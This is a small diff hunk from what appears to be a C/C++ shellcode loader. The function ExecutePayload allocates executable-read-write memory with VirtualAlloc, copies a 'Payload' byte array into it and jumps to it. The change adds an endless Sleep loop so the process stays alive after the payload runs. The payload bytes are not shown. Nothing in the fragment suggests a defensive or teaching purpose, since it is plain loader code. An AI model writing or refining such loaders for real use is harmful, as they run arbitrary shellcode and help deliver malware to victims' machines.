@@ -24,7 +24,11 @@ void ExecutePayload(){
 
 	char* BUFFER = (char*)VirtualAlloc(NULL, sizeof(Payload), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	memcpy(BUFFER, Payload, sizeof(Payload));
-	(*(void(*)())BUFFER)();	
+	(*(void(*)())BUFFER)();
+	
+	while(true){
+		Sleep(1000);
+	}
 }
 
 
